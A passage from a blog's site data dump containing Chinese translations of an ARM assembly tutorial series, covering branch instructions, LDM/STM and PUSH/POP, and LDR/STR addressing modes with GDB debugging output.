/r1_lower:mov r0, r2 / 将R2的值放到R0 /b end / 跳转到结束 /end:bx lr / THE END / 上面的汇编代码的含义就是找到较大的数，类似的C伪代码是这样的: 123456789101112int main() &#123;int max = 0;int a = 2;int b = 3;if(a &lt; b) &#123;max = b;&#125;else &#123;max = a;&#125;return max;&#125; 再来看看循环中的条件分支: 12345678910.global mainmain:mov r0, #0 / 初始化 a /loop:cmp r0, #4 / 检查 a==4 /beq end / 如果是则结束 /add r0, r0, #1 / 如果不是则加1 /b loop / 重复循环 /end:bx lr / THE END / 对应的C伪代码长这样子: 1234567int main() &#123;int a = 0;while(a &lt; 4) &#123;a= a+1;&#125;return a;&#125; B/BX/BLX有三种类型的分支指令: Branch(B) 简单的跳转到一个函数 Branch link(BL) 将下一条指令的入口(PC+4)保存到LR，跳转到函数 Branch exchange(BX) 以及 Branch link exchange(BLX) 与B/BL相同，外加执行模式切换(ARM与Thumb) 需要寄存器类型作为第一操作数:BX/BLX reg BX/BLX指令被用来从ARM模式切换到Thumb模式。 12345678.text.global _start_start:.code 32 @ ARM模式add r2, pc, #1 @ PC+1放到R2bx r2 @ 分支切换到R2.code 16 @ Thumb模式 mov r0, #1 上面的代码将当前的PC值加1存放到了R2中(此时PC指向其后两条指令的偏移处)，通过BX跳转到了寄存器指向的位置，由于最低有效位为1，所以切换到Thumb模式执行。下面GDB调试的动图说明了这一切。 条件分支指令条件分支指令是指在满足某种特定条件下的跳转指令。指令模式是跳转指令后加上条件后缀。我们用BEQ来举例吧。下面这段汇编代码对一些值做了操作，然后依据比较结果进行条件分支跳转。 对应汇编代码如下: 12345678910111213141516.text.global _start_start:mov r0, #2mov r1, #2add r0, r0, r1cmp r0, #4beq func1add r1, #5b func2func1:mov r1, r0bx lrfunc2:mov r0, r1bx lr","categories":[{"name":"ARM汇编","slug":"ARM汇编","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/ARM%E6%B1%87%E7%BC%96/"}],"tags":[{"name":"ARM","slug":"ARM","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/ARM/"}]},{"title":"Part 5: 重复性加载及存储","slug":"ARM汇编/Part-5-重复性加载及存储","date":"2020-11-09T05:01:56.000Z","updated":"2020-11-10T07:09:28.000Z","comments":true,"path":"2020/11/09/ARM汇编/Part-5-重复性加载及存储/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/11/09/ARM%E6%B1%87%E7%BC%96/Part-5-%E9%87%8D%E5%A4%8D%E6%80%A7%E5%8A%A0%E8%BD%BD%E5%8F%8A%E5%AD%98%E5%82%A8/","excerpt":"","text":"连续加载/存储有时连续加载(存储)会显得更加高效。因为我们可以使用LDM(load multiple)以及STM(store multiple)。这些指令基于起始地址的不同，有不同的形式。下面是我们会在这一节用到的相关代码。在下文中会详细讲解。 1234567891011121314151617181920212223242526272829303132333435.dataarray_buff: .word 0x00000000 /* array_buff[0] */ .word 0x00000000 /* array_buff[1] */ .word 0x00000000 /* array_buff[2]. 这一项存的是指向array_buff+8的指针 */ .word 0x00000000 /* array_buff[3] */ .word 0x00000000 /* array_buff[4] */.text.global mainmain: adr r0, words+12 /* words[3]的地址 -&gt; r0 */ ldr r1, array_buff_bridge /* array_buff[0]的地址 -&gt; r1 */ ldr r2, array_buff_bridge+4 /* array_buff[2]的地址 -&gt; r2 */ ldm r0, &#123;r4,r5&#125; /* words[3] -&gt; r4 = 0x03; words[4] -&gt; r5 = 0x04 */ stm r1, &#123;r4,r5&#125; /* r4 -&gt; array_buff[0] = 0x03; r5 -&gt; array_buff[1] = 0x04 */ ldmia r0, &#123;r4-r6&#125; /* words[3] -&gt; r4 = 0x03, words[4] -&gt; r5 = 0x04; words[5] -&gt; r6 = 0x05; */ stmia r1, &#123;r4-r6&#125; /* r4 -&gt; array_buff[0] = 0x03; r5 -&gt; array_buff[1] = 0x04; r6 -&gt; array_buff[2] = 0x05 */ ldmib r0, &#123;r4-r6&#125; /* words[4] -&gt; r4 = 0x04; words[5] -&gt; r5 = 0x05; words[6] -&gt; r6 = 0x06 */ stmib r1, &#123;r4-r6&#125; /* r4 -&gt; array_buff[1] = 0x04; r5 -&gt; array_buff[2] = 0x05; r6 -&gt; array_buff[3] = 0x06 */ ldmda r0, &#123;r4-r6&#125; /* words[3] -&gt; r6 = 0x03; words[2] -&gt; r5 = 0x02; words[1] -&gt; r4 = 0x01 */ ldmdb r0, &#123;r4-r6&#125; /* words[2] -&gt; r6 = 0x02; words[1] -&gt; r5 = 0x01; words[0] -&gt; r4 = 0x00 */ stmda r2, &#123;r4-r6&#125; /* r6 -&gt; array_buff[2] = 0x02; r5 -&gt; array_buff[1] = 0x01; r4 -&gt; array_buff[0] = 0x00 */ stmdb r2, &#123;r4-r5&#125; /* r5 -&gt; array_buff[1] = 0x01; r4 -&gt; array_buff[0] = 0x00; */ bx lrwords: .word 0x00000000 /* words[0] */ .word 0x00000001 /* words[1] */ .word 0x00000002 /* words[2] */ .word 0x00000003 /* words[3] */ .word 0x00000004 /* words[4] */ .word 0x00000005 /* words[5] */ .word 0x00000006 /* words[6] */array_buff_bridge: .word array_buff /* array_buff的地址*/ .word array_buff+8 /* array_buff[2]的地址 */ 在开始前，再深化一个概念，就是.word标识是对内存中长度为32位的数据块作引用。这对于理解代码中的偏移量很重要。所以程序中由.data段组成的数据，内存中会申请一个长度为5的4字节数组array_buff。我们的所有内存存储操作，都是针对这段内存中的数据段做读写的。而.text端包含着我们对内存操作的代码以及只读的两个标签，一个标签是含有七个元素的数组，另一个是为了链接.text段和.data段所存在的对于array_buff的引用。下面就开始一行行的分析了！ 1adr r0, words+12 /* words[3]的地址 -&gt; r0 */ 我们用ADR指令来获得words[3]的地址，并存到R0中。我们选了一个中间的位置是因为一会要做向前以及向后的操作。 123gef&gt; break _start gef&gt; rungef&gt; nexti R0当前就存着words[3]的地址了，也就是0x80B8。也就是说，我们的数组word[0]的地址是:0x80AC(0x80B8-0XC)。 123gef&gt; x/7w 0x00080AC0x80ac &lt;words&gt;: 0x00000000 0x00000001 0x00000002 0x000000030x80bc &lt;words+16&gt;: 0x00000004 0x00000005 0x00000006 接下来我们把R1和R2指向array_buff[0]以及array_buff[2]。在获取了这些指针后，我们就可以操作这个数组了。 12ldr r1, array_buff_bridge /* array_buff[0]的地址 -&gt; r1 */ldr r2, array_buff_bridge+4 /* array_buff[2]的地址 -&gt; r2 */ 执行完上面这两条指令后，R1和R2的变化。 123gef&gt; info register r1 r2r1 0x100d0 65744r2 0x100d8 65752 下一条LDM指令从R0指向的内存中加载了两个字的数据。因为R0指向words[3]的起始处，所以words[3]的值赋给R4，words[4]的值赋给R5。 1ldm r0, &#123;r4,r5&#125; /* words[3] -&gt; r4 = 0x03; words[4] -&gt; r5 = 0x04 */ 所以我们用一条指令加载了两个数据块，并且放到了R4和R5中。 123gef&gt; info registers r4 r5r4 0x3 3r5 0x4 4 看上去不错，再来看看STM指令。STM指令将R4与R5中的值0x3和0x4存储到R1指向的内存中。这里R1指向的是array_buff[0]，也就是说 array_buff[0] = 0x00000003以及array_buff[1] = 0x00000004。如不特定指定，LDM与STM指令操作的最小单位都是一个字(四字节)。 1stm r1, &#123;r4,r5&#125; /* r4 -&gt; array_buff[0] = 0x03; r5 -&gt; array_buff[1] = 0x04 */ 值0x3与0x4被存储到了R1指向的地方0x100D0以及0x100D4。 12gef&gt; x/2w 0x000100D00x100d0 &lt;array_buff&gt;: 0x00000003 0x00000004 之前说过LDM和STM有多种形式。不同形式的扩展字符和含义都不同： 1234IA(increase after)IB(increase before)DA(decrease after)DB(decrease before) 这些扩展划分的主要依据是，作为源地址或者目的地址的指针是在访问内存前增减，还是访问内存后增减。以及，LDM与LDMIA功能相同，都是在加载操作完成后访问对地址增加的。通过这种方式，我们可以序列化的向前或者向后从一个指针指向的内存加载数据到寄存器，或者存放数据到内存。如下示意代码 。 12ldmia r0, &#123;r4-r6&#125; /* words[3] -&gt; r4 = 0x03, words[4] -&gt; r5 = 0x04; words[5] -&gt; r6 = 0x05; */ stmia r1, &#123;r4-r6&#125; /* r4 -&gt; array_buff[0] = 0x03; r5 -&gt; array_buff[1] = 0x04; r6 -&gt; array_buff[2] = 0x05 */ 在执行完这两条代码后，R4到R6寄存器所访问的内存地址以及存取的值是0x000100D0，0x000100D4，以及0x000100D8，值对应是 0x3，0x4，以及0x5。 123456gef&gt; info registers r4 r5 r6r4 0x3 3r5 0x4 4r6 0x5 5gef&gt; x/3w 0x000100D00x100d0 &lt;array_buff&gt;: 0x00000003 0x00000004 0x00000005 而LDMIB指令会首先对指向的地址先加4，然后再加载数据到寄存器中。所以第一次加载的时候也会对指针加4，所以存入寄存器的是0X4(words[4])而不是0x3(words[3])。 12ldmib r0, &#123;r4-r6&#125; /* words[4] -&gt; r4 = 0x04; words[5] -&gt; r5 = 0x05; words[6] -&gt; r6 = 0x06 */stmib r1, &#123;r4-r6&#125; /* r4 -&gt; array_buff[1] = 0x04; r5 -&gt; array_buff[2] = 0x05; r6 -&gt; array_buff[3] = 0x06 */ 执行后的调试示意: 123456gef&gt; x/3w 0x100D40x100d4 &lt;array_buff+4&gt;: 0x00000004 0x00000005 0x00000006gef&gt; info register r4 r5 r6r4 0x4 4r5 0x5 5r6 0x6 6 当用LDMDA指令时，执行的就是反向操作了。R0指向words[3]，当加载数据时数据的加载方向变成加载words[3]，words[2]，words[1]的值到R6，R5，R4中。这种加载流程发生的原因是我们LDM指令的后缀是DA，也就是在加载操作完成后，会将指针做递减的操作。注意在做减法模式下的寄存器的操作是反向的，这么设定的原因为了保持让编号大的寄存器访问高地址的内存的原则。 多次加载，后置减法： 1ldmda r0, &#123;r4-r6&#125; /* words[3] -&gt; r6 = 0x03; words[2] -&gt; r5 = 0x02; words[1] -&gt; r4 = 0x01 */ 执行之后，R4-R6的值： 1234gef&gt; info register r4 r5 r6r4 0x1 1r5 0x2 2r6 0x3 3 多次加载，前置减法： 1ldmdb r0, &#123;r4-r6&#125; /* words[2] -&gt; r6 = 0x02; words[1] -&gt; r5 = 0x01; words[0] -&gt; r4 = 0x00 */ 执行之后，R4-R6的值： 1234gef&gt; info register r4 r5 r6r4 0x0 0r5 0x1 1r6 0x2 2 多次存储，后置减法： 1234stmda r2, &#123;r4-r6&#125; /* r6 -&gt; array_buff[2] = 0x02; r5 -&gt; array_buff[1] = 0x01; r4 -&gt; array_buff[0] = 0x00 */执行之后，array_buff[2]，array_buff[1]，以及array_buff[0]的值：gef&gt; x/3w 0x100D00x100d0 &lt;array_buff&gt;: 0x00000000 0x00000001 0x00000002 多次存储，前置减法： 1stmdb r2, &#123;r4-r5&#125; /* r5 -&gt; array_buff[1] = 0x01; r4 -&gt; array_buff[0] = 0x00; */ 执行之后，array_buff[1]，以及array_buff[0]的值： 12gef&gt; x/2w 0x100D00x100d0 &lt;array_buff&gt;: 0x00000000 0x00000001 PUSH和POP 在内存中存在一块进程相关的区域叫做栈。栈指针寄存器SP在正常情形下指向这篇区域。应用经常通过栈做临时的数据存储。X86使用PUSH和POP来访问存取栈上数据。在ARM中我们也可以用这两条指令： 当PUSH压栈时，会发生以下事情： SP值减4。 存放信息到SP指向的位置。 当POP出栈时，会发生以下事情： 数据从SP指向位置被加载 SP值加4。 下面是我们使用PUSH/POP以及LDMIA/STMDB命令示例: 12345678910.text.global _start_start: mov r0, #3 mov r1, #4 push &#123;r0, r1&#125; pop &#123;r2, r3&#125; stmdb sp!, &#123;r0, r1&#125; ldmia sp!, &#123;r4, r5&#125; bkpt 让我们来看看这段汇编的反汇编： 12345678910111213azeria@labs:~$ as pushpop.s -o pushpop.oazeria@labs:~$ ld pushpop.o -o pushpopazeria@labs:~$ objdump -D pushpoppushpop: file format elf32-littlearmDisassembly of section .text:00008054 &lt;_start&gt;: 8054: e3a00003 mov r0, #3 8058: e3a01004 mov r1, #4 805c: e92d0003 push &#123;r0, r1&#125; 8060: e8bd000c pop &#123;r2, r3&#125; 8064: e92d0003 push &#123;r0, r1&#125; 8068: e8bd0030 pop &#123;r4, r5&#125; 806c: e1200070 bkpt 0x0000 可以看到，我们的LDMIA以及STMDB指令被编译器换为了PUSH和POP。因为PUSH和STMDB sp!是等效的。同样的还有POP和LDMIA sp!。让我们在GDB里面跑一下上面那段汇编代码。 123456gef&gt; break _startgef&gt; rungef&gt; nexti 2[...]gef&gt; x/w $sp0xbefff7e0: 0x00000001 在连续执行完前两条指令后，我们来看看SP，下一条PUSH指令会将其减8，并将R1和R0的值按序存放到栈上。 12345678gef&gt; nexti[...] ----- Stack -----0xbefff7d8|+0x00: 0x3 &lt;- $sp0xbefff7dc|+0x04: 0x40xbefff7e0|+0x08: 0x1[...] gef&gt; x/w $sp0xbefff7d8: 0x00000003 再之后，这两个值被出栈，按序存到寄存器R2和R3中，之后SP加8。 123456gef&gt; nextigef&gt; info register r2 r3r2 0x3 3r3 0x4 4gef&gt; x/w $sp0xbefff7e0: 0x00000001","categories":[{"name":"ARM汇编","slug":"ARM汇编","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/ARM%E6%B1%87%E7%BC%96/"}],"tags":[{"name":"ARM","slug":"ARM","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/ARM/"}]},{"title":"Part 4: 内存相关指令——加载以及存储","slug":"ARM汇编/Part-4-内存相关指令——加载以及存储","date":"2020-11-09T05:01:37.000Z","updated":"2020-11-10T06:48:58.000Z","comments":true,"path":"2020/11/09/ARM汇编/Part-4-内存相关指令——加载以及存储/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/11/09/ARM%E6%B1%87%E7%BC%96/Part-4-%E5%86%85%E5%AD%98%E7%9B%B8%E5%85%B3%E6%8C%87%E4%BB%A4%E2%80%94%E2%80%94%E5%8A%A0%E8%BD%BD%E4%BB%A5%E5%8F%8A%E5%AD%98%E5%82%A8/","excerpt":"","text":"ARM使用加载-存储模式控制对内存的访问，这意味着只有加载/存储(LDR或者STR)才能访问内存。尽管X86中允许很多指令直接操作在内存中的数据，但ARM中依然要求在操作数据前，必须先从内存中将数据取出来。这就意味着如果要增加一个32位的在内存中的值，需要做三种类型的操作(加载，加一，存储)将数据从内存中取到寄存器，对寄存器中的值加一，再将结果放回到内存中。 为了解释ARM架构中的加载和存储机制，我们准备了一个基础的例子以及附加在这个基础例子上的三种不同的对内存地址的便宜访问形式。每个例子除了STR/LDR的偏移模式不同外，其余的都一样。而且这个例子很简单，最佳的实践方式是用GDB去调试这段汇编代码。 第一种偏移形式：立即数作为偏移 地址模式：用作偏移 地址模式：前向索引 地址模式：后向索引 第二种偏移形式：寄存器作为偏移 地址模式：用作偏移 地址模式：前向索引 地址模式：后向索引 第三种偏移形式：寄存器缩放值作为偏移 地址模式：用作偏移 地址模式：前向索引 地址模式：后向索引 基础样例代码通常，LDR被用来从内存中加载数据到寄存器，STR被用作将寄存器的值存放到内存中。 1234LDR R2, [R0] @ [R0] - 数据源地址来自于R0指向的内存地址@ LDR操作：从R0指向的地址中取值放到R2中STR R2, [R1] @ [R1] - 目的地址来自于R1在内存中指向的地址@ STR操作：将R2中的值放到R1指向的地址中 样例程序的汇编代码及解释如下： 12345678910111213.data /* 数据段是在内存中动态创建的，所以它的在内存中的地址不可预测*/var1: .word 3 /* 内存中的第一个变量 */var2: .word 4 /* 内存中的第二个变量 */.text /* 代码段开始 */ .global _start_start: ldr r0, adr_var1 @ 将存放var1值的地址adr_var1加载到寄存器R0中 ldr r1, adr_var2 @ 将存放var2值的地址adr_var2加载到寄存器R1中 ldr r2, [r0] @ 将R0所指向地址中存放的0x3加载到寄存器R2中 str r2, [r1] @ 将R2中的值0x3存放到R1做指向的地址 bkpt adr_var1: .word var1 /* var1的地址助记符 */adr_var2: .word var2 /* var2的地址助记符 */ 在底部我们有我们的文字标识池(在代码段中用来存储常量，字符串，或者偏移等的内存，可以通过位置无关的方式引用)，分别用adr_var1和adr_var2存储着变量var1和var2的内存地址(var1和var2的值在数据段定义)。第一条LDR指令将变量var1的地址加载到寄存器R0。第二条LDR指令同样将var2的地址加载到寄存器R1。之后我们将存储在R0指向的内存地址中的值加载到R2，最后将R2中的值存储到R1指向的内存地址中。 当我们加载数据到寄存器时，方括号“[]”意味着：将其中的值当做内存地址，并取这个内存地址中的值加载到对应寄存器。 当我们存储数据到内存时，方括号“[]”意味着：将其中的值当做内存地址，并向这个内存地址所指向的位置存入对应的值。 听者好像有些抽象，所以再来看看这个动画吧： 同样的再来看看的这段代码在调试器中的样子： 12345678gef&gt; disassemble _startDump of assembler code for function _start: 0x00008074 &lt;+0&gt;: ldr r0, [pc, #12] ; 0x8088 &lt;adr_var1&gt; 0x00008078 &lt;+4&gt;: ldr r1, [pc, #12] ; 0x808c &lt;adr_var2&gt; 0x0000807c &lt;+8&gt;: ldr r2, [r0] 0x00008080 &lt;+12&gt;: str r2, [r1] 0x00008084 &lt;+16&gt;: bx lrEnd of assembler dump. 可以看到此时的反汇编代码和我们编写的汇编代码有出入了。前两个LDR操作的源寄存器被改成了[pc,#12]。这种操作叫做PC相对地址。因为我们在汇编代码中使用的只是数据的标签，所以在编译时候编译器帮我们计算出来了与我们想访问的文字标识池的相对便宜，即PC+12。你也可以看汇编代码中手动计算验证这个偏移是正确的，以adr_var1为例，执行到8074时，其当前有效PC与数据段还有三个四字节的距离，所以要加12。关于PC相对取址我们接下来还会接着介绍。 PS：如果你对这里的PC的地址有疑问，可以看外面第二篇关于程序执行时PC的值的说明，PC是指向当前执行指令之后第二条指令所在位置的，在32位ARM模式下是当前执行位置加偏移值8，在Thumb模式下是加偏移值4。这也是与X86架构PC的区别之所在。 第一种偏移形式：立即数作偏移12STR Ra, [Rb, imm]LDR Ra, [Rc, imm] 在这段汇编代码中，我们使用立即数作为偏移量。这个立即数被用来与一个寄存器中存放的地址做加减操作(下面例子中的R1)，以访问对应地址偏移处的数据。 123456789101112131415.datavar1: .word 3var2: .word 4.text.global _start_start: ldr r0, adr_var1 @ 将存放var1值的地址adr_var1加载到寄存器R0中 ldr r1, adr_var2 @ 将存放var2值的地址adr_var2加载到寄存器R1中 ldr r2, [r0] @ 将R0所指向地址中存放的0x3加载到寄存器R2中 str r2, [r1, #2] @ 取址模式：基于偏移量。R2寄存器中的值0x3被存放到R1寄存器的值加2所指向地址处。 str r2, [r1, #4]! @ 取址模式：基于索引前置修改。R2寄存器中的值0x3被存放到R1寄存器的值加4所指向地址处，之后R1寄存器中存储的值加4,也就是R1=R1+4。 ldr r3, [r1], #4 @ 取址模式：基于索引后置修改。R3寄存器中的值是从R1寄存器的值所指向的地址中加载的，加载之后R1寄存器中存储的值加4,也就是R1=R1+4。 bkptadr_var1: .word var1adr_var2: .word var2 让我们把上面的这段汇编代码编译一下，并用GDB调试起来看看真实情况。 123$ as ldr.s -o ldr.o$ ld ldr.o -o ldr$ gdb ldr 在GDB(使用GEF插件)中，我们对_start下一个断点并继续运行程序。 1234gef&gt; break _startgef&gt; run...gef&gt; nexti 3 /* 向后执行三条指令 */ 执行完上述GDB指令后，在我的系统的寄存器的值现在是这个样子(在你的系统里面可能不同)： 1234567891011121314151617$r0 : 0x00010098 -&gt; 0x00000003$r1 : 0x0001009c -&gt; 0x00000004$r2 : 0x00000003$r3 : 0x00000000$r4 : 0x00000000$r5 : 0x00000000$r6 : 0x00000000$r7 : 0x00000000$r8 : 0x00000000$r9 : 0x00000000$r10 : 0x00000000$r11 : 0x00000000$r12 : 0x00000000$sp : 0xbefff7e0 -&gt; 0x00000001$lr : 0x00000000$pc : 0x00010080 -&gt; &lt;_start+12&gt; str r2, [r1]$cpsr : 0x00000010 下面来分别调试这三条关键指令。首先执行基于地址偏移的取址模式的STR操作了。就会将R2(0x00000003)中的值存放到R1(0x0001009c)所指向地址偏移2的位置0x1009e。下面一段是执行完对应STR操作后对应内存位置的值。 123gef&gt; nextigef&gt; x/w 0x1009e 0x1009e &lt;var2+2&gt;: 0x3 下一条STR操作使用了基于索引前置修改的取址模式。这种模式的识别特征是(!)。区别是在R2中的值被存放到对应地址后，R1的值也会被更新。这意味着，当我们将R2中的值0x3存储到R1(0x1009c)的偏移4之后的地址0x100A0后，R1的值也会被更新到为这个地址。下面一段是执行完对应STR操作后对应内存位置以及寄存器的值。 12345gef&gt; nextigef&gt; x/w 0x100A00x100a0: 0x3gef&gt; info register r1r1 0x100a0 65696 最后一个LDR操作使用了基于索引后置的取址模式。这意味着基础寄存器R1被用作加载的内存地址，之后R1的值被更新为R1+4。换句话说，加载的是R1所指向的地址而不是R1+4所指向的地址，也就是0x100A0中的值被加载到R3寄存器，然后R1寄存器的值被更新为0x100A0+0x4也就是0x100A4。下面一段是执行完对应LDR操作后对应内存位置以及寄存器的值。 1234gef&gt; info register r1r1 0x100a4 65700gef&gt; info register r3r3 0x3 3 下图是这个操作发生的动态示意图： 第二种偏移形式：寄存器作偏移12STR Ra, [Rb, Rc]LDR Ra, [Rb, Rc] 在这个偏移模式中，寄存器的值被用作偏移。下面的样例代码展示了当试着访问数组的时候是如何计算索引值的。 123456789101112131415.datavar1: .word 3var2: .word 4.text.global _start_start: ldr r0, adr_var1 @ 将存放var1值的地址adr_var1加载到寄存器R0中 ldr r1, adr_var2 @ 将存放var2值的地址adr_var2加载到寄存器R1中 ldr r2, [r0] @ 将R0所指向地址中存放的0x3加载到寄存器R2中 str r2, [r1, r2] @ 取址模式：基于偏移量。R2寄存器中的值0x3被存放到R1寄存器的值加R2寄存器的值所指向地址处。R1寄存器不会被修改。 str r2, [r1, r2]! @ 取址模式：基于索引前置修改。R2寄存器中的值0x3被存放到R1寄存器的值加R2寄存器的值所指向地址处，之后R1寄存器中的值被更新,也就是R1=R1+R2。 ldr r3, [r1], r2 @ 取址模式：基于索引后置修改。R3寄存器中的值是从R1寄存器的值所指向的地址中加载的，加载之后R1寄存器中的值被更新也就是R1=R1+R2。 bx lradr_var1: .word var1adr_var2: .word var2 下面来分别调试这三条关键指令。在执行完基于偏移量的取址模式的STR操作后，R2的值被存在了地址0x1009c + 0x3 = 0x1009F处。下面一段是执行完对应STR操作后对应内存位置的值。 12gef&gt; x/w 0x0001009F 0x1009f &lt;var2+3&gt;: 0x00000003 下一条STR操作使用了基于索引前置修改的取址模式，R1的值被更新为R1+R2的值。下面一段是执行完对应STR操作后寄存器的值。 12gef&gt; info register r1 r1 0x1009f 65695 最后一个LDR操作使用了基于索引后置的取址模式。将R1指向的值加载到R2之后，更新了R1寄存器的值(R1+R2 = 0x1009f + 0x3 = 0x100a2)。下面一段是执行完对应LDR操作后对应内存位置以及寄存器的值。 1234gef&gt; info register r1 r1 0x100a2 65698gef&gt; info register r3 r3 0x3 3 下图是这个操作发生的动态示意图: 第三种偏移形式：寄存器缩放值作偏移12LDR Ra, [Rb, Rc, &lt;shifter&gt;]STR Ra, [Rb, Rc, &lt;shifter&gt;] 在这种偏移形式下，第三个偏移量还有一个寄存器做支持。Rb是基址寄存器，Rc中的值作为偏移量，或者是要被左移或右移的次的值。这意味着移位器shifter被用来用作缩放Rc寄存器中存放的偏移量。下面的样例代码展示了对一个数组的循环操作。同样的，我们也会用GDB调试这段代码。 123456789101112131415.datavar1: .word 3var2: .word 4.text.global _start_start: ldr r0, adr_var1 @ 将存放var1值的地址adr_var1加载到寄存器R0中 ldr r1, adr_var2 @ 将存放var2值的地址adr_var2加载到寄存器R1中 ldr r2, [r0] @ 将R0所指向地址中存放的0x3加载到寄存器R2中 str r2, [r1, r2, LSL#2] @ 取址模式：基于偏移量。R2寄存器中的值0x3被存放到R1寄存器的值加(左移两位后的R2寄存器的值)所指向地址处。R1寄存器不会被修改。 str r2, [r1, r2, LSL#2]! @ 取址模式：基于索引前置修改。R2寄存器中的值0x3被存放到R1寄存器的值加(左移两位后的R2寄存器的值)所指向地址处，之后R1寄存器中的值被更新,也就R1 = R1 + R2&lt;&lt;2。 ldr r3, [r1], r2, LSL#2 @ 取址模式：基于索引后置修改。R3寄存器中的值是从R1寄存器的值所指向的地址中加载的，加载之后R1寄存器中的值被更新也就是R1 = R1 + R2&lt;&lt;2。 bkptadr_var1: .word var1adr_var2: .word var2 下面来分别调试这三条关键指令。在执行完基于偏移量的取址模式的STR操作后，R2被存储到的位置是[r1,r2,LSL#2]，也就是说被存储到R1+(R2&lt;&lt;2)的位置了，如下图所示: 下一条STR操作使用了基于索引前置修改的取址模式，R1的值被更新为R1+(R2&lt;&lt;2)的值。下面一段是执行完对应STR操作后寄存器的值。 12gef&gt; info register r1r1 0x100a8 65704 最后一个LDR操作使用了基于索引后置的取址模式。将R1指向的值加载到R2之后，更新了R1寄存器的值(R1+R2 = 0x100a8 + (0x3&lt;&lt;2) = 0x100b4)。下面一段是执行完对应LDR操作后寄存器的值。 12gef&gt; info register r1r1 0x100b4 65716 小结LDR/STR的三种偏移模式： 立即数作为偏移 1ldr r3, [r1, #4] 寄存器作为偏移 1ldr r3, [r1, r2] 寄存器缩放值作为偏移 1ldr r3, [r1, r2, LSL#2] 如何区分取址模式： 如果有一个叹号!，那就是索引前置取址模式，即使用计算后的地址，之后更新基址寄存器。 123ldr r3, [r1, #4]!ldr r3, [r1, r2]!ldr r3, [r1, r2, LSL#2]! 如果在[]外有一个寄存器，那就是索引后置取址模式，即使用原有基址寄存器中的地址，之后再更新基址寄存器 123ldr r3, [r1], #4ldr r3, [r1], r2ldr r3, [r1], r2, LSL#2 除此之外，就都是偏移取址模式了 123ldr r3, [r1, #4]ldr r3, [r1, r2]ldr r3, [r1, r2, LSL#2] 地址模式：用作偏移 地址模式：前向索引 地址模式：后向索引 关于PC相对取址的LDR指令有时候LDR并不仅仅被用来从内存中加载数据。还有如下这操作: 12345678.section .text.global _start_start: ldr r0, =jump /* 加载jump标签所在的内存位置到R0 */ ldr r1, =0x68DB00AD /* 加载立即数0x68DB00AD到R1 */jump: ldr r2, =511 /* 加载立即数511到R2 */ bkpt 这些指令学术上被称作伪指令。但我们在编写ARM汇编时可以用这种格式的指令去引用我们文字标识池中的数据。在上面的例子中我们用一条指令将一个32位的常量值放到了一个寄存器中。为什么我们会这么写是因为ARM每次仅仅能加载8位的值，原因倾听我解释立即数在ARM架构下的处理。 在ARM中使用立即数的规律在ARM中不能像X86那样直接将立即数加载到寄存器中。因为你使用的立即数是受限的。这些限制听上去有些无聊。但是听我说，这也是为了告诉你绕过这些限制的技巧(通过LDR)。 我们都知道每条ARM指令的宽度是32位，所有的指令都是可以条件执行的。我们有16中条件可以使用而且每个条件在机器码中的占位都是4位。之后我们需要2位来做为目的寄存器。2位作为第一操作寄存器，1位用作设置状态的标记位，再加上比如操作码(opcode)这些的占位。最后每条指令留给我们存放立即数的空间只有12位宽。也就是4096个不同的值。 这也就意味着ARM在使用MOV指令时所能操作的立即数值范围是有限的。那如果很大的话，只能拆分成多个部分外加移位操作拼接了。 所以这剩下的12位可以再次划分，8位用作加载0-255中的任意值，4位用作对这个值做0~30位的循环右移。这也就意味着这个立即数可以通过这个公式得到：v = n ror 2*r。换句话说，有效的立即数都可以通过循环右移来得到。这里有一个例子 有效值: 12345678910#256 // 1 循环右移 24位 --&gt; 256#384 // 6 循环右移 26位 --&gt; 384#484 // 121 循环右移 30位 --&gt; 484#16384 // 1 循环右移 18位 --&gt; 16384#2030043136 // 121 循环右移 8位 --&gt; 2030043136#0x06000000 // 6 循环右移 8位 --&gt; 100663296 (十六进制值0x06000000)Invalid values:#370 // 185 循环右移 31位 --&gt; 31不在范围内 (0 – 30)#511 // 1 1111 1111 --&gt; 比特模型不符合#0x06010000 // 1 1000 0001.. --&gt; 比特模型不符合 看上去这样并不能一次性加载所有的32位值。不过我们可以通过以下的两个选项来解决这个问题： 用小部分去组成更大的值。 比如对于指令MOV r0, #511 将511分成两部分：MOV r0, #256, and ADD r0, #255 用加载指令构造ldr r1,=value的形式，编译器会帮你转换成MOV的形式，如果失败的话就转换成从数据段中通过PC相对偏移加载。 1LDR r1, =511 如果你尝试加载一个非法的值，编译器会报错并且告诉你 invalid constant。如果在遇到这个问题，你现在应该知道该怎么解决了吧。唉还是举个栗子，就比如你想把511加载到R0。 12345.section .text.global _start_start: mov r0, #511 bkpt 这样做的结果就是编译报错: 123azeria@labs:~$ as test.s -o test.otest.s: Assembler messages:test.s:5: Error: invalid constant (1ff) after fixup 你需要将511分成多部分，或者直接用LDR指令。 1234567.section .text.global _start_start: mov r0, #256 /* 1 ror 24 = 256, so it&#x27;s valid */ add r0, #255 /* 255 ror 0 = 255, valid. r0 = 256 + 255 = 511 */ ldr r1, =511 /* load 511 from the literal pool using LDR */ bkpt 如果你想知道你能用的立即数的有效值，你不需要自己计算。我这有个小脚本 rotator.py,用法如下。 1234567azeria@labs:~$ python rotator.pyEnter the value you want to check: 511Sorry, 511 cannot be used as an immediate number and has to be split.azeria@labs:~$ python rotator.pyEnter the value you want to check: 256The number 256 can be used as a valid immediate number.1 ror 24 --&gt; 256","categories":[{"name":"ARM汇编","slug":"ARM汇编","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/ARM%E6%B1%87%E7%BC%96/"}],"tags":[{"name":"ARM","slug":"ARM","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/ARM/"}]},{"title":"Part 3: 